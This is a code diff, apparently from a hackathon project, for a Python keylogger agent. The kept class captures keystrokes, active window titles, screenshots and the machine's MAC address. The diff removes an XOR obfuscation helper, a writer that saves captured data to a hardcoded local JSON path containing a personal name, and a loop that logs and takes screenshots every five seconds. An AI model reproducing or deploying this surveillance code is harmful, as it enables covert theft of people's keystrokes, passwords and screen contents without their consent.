@@ -1,12 +1,9 @@
-import threading
-import time
 import keyboard
 import os
-import  json
+import time
+from PIL import ImageGrab
 from getmac import get_mac_address
 import win32gui
-from PIL import ImageGrab
-
 
 class KeyloggerService:
     def __init__(self):
@@ -79,54 +76,3 @@ class KeyloggerService:
 
     def __exit__(self, exc_type, exc_val, exc_tb):
         return 1
-
-class Encryptor:
-
-    def xor_encryption(self,text, key):
-        # Initialize an empty string for encrypted text
-        encrypted_text = ""
-
-        # Iterate over each character in the text
-        for i in range(len(text)):
-            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
-
-        # Return the encrypted text
-        return encrypted_text
-
-
-class FileWriter:
-    @staticmethod
-    def write_to_file(data:dict):
-        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output\my.json" , "w" , encoding="utf-8") as file:
-            json.dump(data , file ,ensure_ascii=False)
-
-
-class KeyLoggerManager:
-
-    def __init__(self):
-        self.instance = KeyloggerService()
-
-    def start(self):
-        self.instance.start()
-
-    def write_to_file(self):
-        FileWriter.write_to_file(self.instance.get_data())
-
-    def main(self):
-        threading.Thread(target=self.start).start()
-
-        while True:
-            print(self.instance.current_app == self.instance.prev_up)
-            self.instance.current_screenshot()
-            threading.Thread(target=self.write_to_file).start()
-
-            time.sleep(5)
-
-
-print(get_mac_address())
-
-A = KeyLoggerManager()
-A.main()
-
-
-
